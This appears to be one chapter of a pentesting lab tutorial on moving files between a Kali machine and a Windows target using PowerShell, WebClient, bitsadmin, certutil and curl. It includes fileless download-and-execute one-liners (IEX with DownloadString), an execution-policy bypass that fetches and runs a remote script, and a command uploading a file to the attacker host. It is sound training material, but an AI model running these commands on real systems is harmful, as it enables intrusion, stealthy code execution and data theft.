# 🪟 PowerShell & Windows Transfer — Step-by-Step Guide

> **What is it?** Windows doesn't have `wget` or `curl` built-in (older versions), but it has **PowerShell** — which can download files, execute scripts in memory, and upload data. These are the go-to methods for Windows targets.

> **When to use?** Whenever your target is a **Windows machine**. PowerShell is available on all modern Windows (7+, Server 2008+).

---

## 📋 What You Need

| Item                  | Details                                          |
| --------------------- | ------------------------------------------------ |
| **Kali IP**           | `192.168.56.10` (running HTTP server)            |
| **Windows Target IP** | `192.168.56.30` (or any Windows VM)              |
| **Kali setup**        | Start HTTP server: `python3 -m http.server 8080` |
| **Target**            | Windows with PowerShell (any modern Windows)     |

---

## 🔧 Before You Start: Set Up Kali's HTTP Server

```bash
# On Kali — always start this first
cd ~/Documents/file_transfer_practice
python3 -m http.server 8080
```

> Keep this running in a terminal. Windows will download from this server.

---

## 📥 Method 1: Invoke-WebRequest (Most Common)

> This is the PowerShell version of `wget`.

### On Windows Target (PowerShell)

```powershell
# Download file from Kali
Invoke-WebRequest -Uri "http://192.168.56.10:8080/test_file.txt" -OutFile "C:\temp\test_file.txt"
```

> **Breaking it down:**
> - `Invoke-WebRequest` = the download command
> - `-Uri` = the URL to download from
> - `-OutFile` = where to save it on Windows

### Short version (alias)

```powershell
# 'iwr' is the short alias for Invoke-WebRequest
iwr "http://192.168.56.10:8080/test_file.txt" -OutFile "C:\temp\test_file.txt"

# 'wget' also works as an alias in PowerShell!
wget "http://192.168.56.10:8080/test_file.txt" -OutFile "C:\temp\test_file.txt"
```

### Verify

```powershell
Get-Content C:\temp\test_file.txt
# Should show: "This is a test file from Kali"
```

---

## 📥 Method 2: WebClient.DownloadFile (Older PowerShell)

> Works on older Windows systems where `Invoke-WebRequest` might not exist.

```powershell
# Download using .NET WebClient
(New-Object Net.WebClient).DownloadFile("http://192.168.56.10:8080/test_file.txt", "C:\temp\test_file.txt")
```

> **When to use this?** On Windows 7 or older systems where `Invoke-WebRequest` fails.

---

## 🧠 Method 3: Download and Execute in Memory (Fileless!)

> **This is huge in pentesting!** You download a script and run it directly in memory — no file is ever saved to disk. Harder to detect.

### Using WebClient.DownloadString

```powershell
# Download PowerShell script and execute it immediately
IEX (New-Object Net.WebClient).DownloadString("http://192.168.56.10:8080/script.ps1")
```

> **What happens:**
> - `DownloadString` = downloads the text content (not to a file)
> - `IEX` = Invoke-Expression (runs the downloaded text as code)
> - **No file is saved on disk!**

### Using Invoke-WebRequest

```powershell
# Alternative way
IEX (Invoke-WebRequest -Uri "http://192.168.56.10:8080/script.ps1").Content
```

### Create a test script to try this

```bash
# On Kali — create a simple PowerShell test script
echo 'Write-Host "Hello from Kali! Transfer successful!"' > script.ps1
echo 'Write-Host "Current user: $env:USERNAME"' >> script.ps1
echo 'Write-Host "Machine: $env:COMPUTERNAME"' >> script.ps1
```

> After running the fileless command on Windows, you should see the output but no `script.ps1` file on the disk!

---

## 📤 Method 4: Upload FROM Windows TO Kali

### Start upload server on Kali first

```bash
# On Kali — use the upload server from the HTTP guide
python3 upload_server.py
```

### On Windows — upload a file

```powershell
# Upload file using Invoke-WebRequest
Invoke-WebRequest -Uri "http://192.168.56.10:8080/upload" -Method POST -InFile "C:\important.txt"
```

### Using WebClient

```powershell
(New-Object Net.WebClient).UploadFile("http://192.168.56.10:8080/upload", "C:\important.txt")
```

---

## 📥 Method 5: Bitsadmin (Older Windows, No PowerShell)

> **Bitsadmin** is a built-in Windows tool for managing downloads. Works on very old Windows systems.

```cmd
REM Download file using bitsadmin
bitsadmin /transfer mydownload /download /priority high http://192.168.56.10:8080/test_file.txt C:\temp\test_file.txt
```

> **Breaking it down:**
> - `/transfer mydownload` = name this transfer job
> - `/download` = we're downloading (not uploading)
> - `/priority high` = do it fast
> - URL = source
> - Last part = where to save

> ⚠️ Bitsadmin is slower than PowerShell but works on older systems.

---

## 📥 Method 6: Certutil Download (Built-in!)

> We covered this in the Encoding doc, but it's worth repeating here because it's a key Windows transfer method.

```cmd
REM Download a file
certutil -urlcache -f http://192.168.56.10:8080/test_file.txt C:\temp\test_file.txt
```

> Fast and simple. Available on all Windows versions.

---

## 📥 Method 7: curl and wget on Modern Windows

> **Windows 10/11 and Server 2019+** include `curl.exe` built-in!

```cmd
REM Using Windows built-in curl
curl.exe http://192.168.56.10:8080/test_file.txt -o C:\temp\test_file.txt

REM Check if curl exists
where curl.exe
```

> ⚠️ Note: In PowerShell, `curl` is an alias for `Invoke-WebRequest`. Use `curl.exe` (with `.exe`) to use the real curl.

---

## 🧠 Quick Reference Cheatsheet

| Method                 | Command                                                     | Works On         |
| ---------------------- | ----------------------------------------------------------- | ---------------- |
| **Invoke-WebRequest**  | `iwr URL -OutFile path`                                     | PS 3.0+ (Win 8+) |
| **WebClient Download** | `(New-Object Net.WebClient).DownloadFile(URL, path)`        | All PS           |
| **Fileless execution** | `IEX (New-Object Net.WebClient).DownloadString(URL)`        | All PS           |
| **Bitsadmin**          | `bitsadmin /transfer job /download /priority high URL path` | All Windows      |
| **Certutil**           | `certutil -urlcache -f URL path`                            | All Windows      |
| **curl.exe**           | `curl.exe URL -o path`                                      | Win 10+          |

---

## 🔒 Bypassing Execution Policy

> PowerShell may block script execution. Here's how to handle it.

```powershell
# Check current policy
Get-ExecutionPolicy

# Bypass for current session only
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Or run a script with bypass
powershell -ExecutionPolicy Bypass -File script.ps1

# Or download and run in one line (bypasses policy)
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/script.ps1')"
```

---

## ❗ Common Mistakes & Fixes

| Problem                         | Fix                                                                                   |
| ------------------------------- | ------------------------------------------------------------------------------------- |
| `Invoke-WebRequest` not found   | Use `WebClient` method (older Windows)                                                |
| Execution policy blocks scripts | Use `-ExecutionPolicy Bypass`                                                         |
| `curl` runs Invoke-WebRequest   | Use `curl.exe` instead of `curl` in PowerShell                                        |
| SSL/TLS errors                  | Add `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` |
| `C:\temp` doesn't exist         | Create it: `mkdir C:\temp`                                                            |
| Download is empty/fails         | Check if Kali HTTP server is running                                                  |

---

## ⚖️ Method Comparison

| Feature       | PowerShell IWR   | WebClient          | Bitsadmin   | Certutil       |
| ------------- | ---------------- | ------------------ | ----------- | -------------- |
| Speed         | Fast             | Fast               | Slow        | Fast           |
| Fileless exec | ❌                | ✅ (DownloadString) | ❌           | ❌              |
| Stealth       | Medium           | Medium             | Low         | Low (flagged)  |
| Availability  | Win 8+           | All                | All         | All            |
| Best for      | General download | Fileless attacks   | Old systems | Quick download |

---

## ✅ Practice Checklist

- [ ] Download a file using `Invoke-WebRequest`
- [ ] Download a file using `WebClient.DownloadFile`
- [ ] Execute a script in memory using `IEX + DownloadString`
- [ ] Upload a file back to Kali
- [ ] Try `bitsadmin` download
- [ ] Try `certutil` download
- [ ] Bypass execution policy and run a script

---

> 🔙 **Previous**: [Encoding & Stealth Transfer](./06_encoding_stealth_transfer.md)
> 🔙 **Back to**: [File Transfer Main Guide](./file_transfer.md)
> ➡️ **Next**: [Living Off the Land](./08_lol_transfer.md)
